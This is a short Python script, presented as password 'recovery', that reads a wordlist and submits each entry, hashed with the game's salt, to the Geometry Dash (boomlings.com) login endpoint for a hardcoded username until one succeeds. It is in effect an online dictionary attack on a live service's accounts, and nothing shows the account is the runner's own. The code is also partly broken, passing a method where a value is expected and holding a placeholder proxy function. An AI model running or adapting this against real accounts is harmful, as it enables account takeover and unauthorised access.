import httpx, random
from tkinter import filedialog

from uuid import uuid4
from hashlib import sha1

class Recover():

    def getProxy(self):

        proxy = "xd"

        return proxy

    def getSID(self):

        return [random.randint(0,10) for _ in range(18)]
    
    def getGJP2(self, password):

        secret = f"{password}mI29fmAnxgTs".encode("utf-8")
        hashed_secret = sha1(secret).hexdigest()
        
        return hashed_secret

    def recover(self, username, file_path):

        with open(file_path, "r") as file:

            content = file.readlines()
            for password in content:

                cleaned_password = password.strip()
                print(f"Trying password: {cleaned_password}")

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"
                }

                data = {
                    "udid": uuid4(),
                    "userName": username,
                    "gjp2": self.getGJP2(cleaned_password),
                    "sID": self.getSID,
                    "secret": "Wmfv3899gc9"
                }

                response = httpx.post("https://www.boomlings.com/database/accounts/loginGJAccount.php", headers=headers, data=data)

                if "," in response.text:
                    print(f"Your password is: {password}")
                    break

if __name__ == "__main__":

    recover = Recover()
    file_path = filedialog.askopenfilename(title="Select a Text File", filetypes=[("Text files", "*.txt")])

    recover.recover("rV4n", file_path)
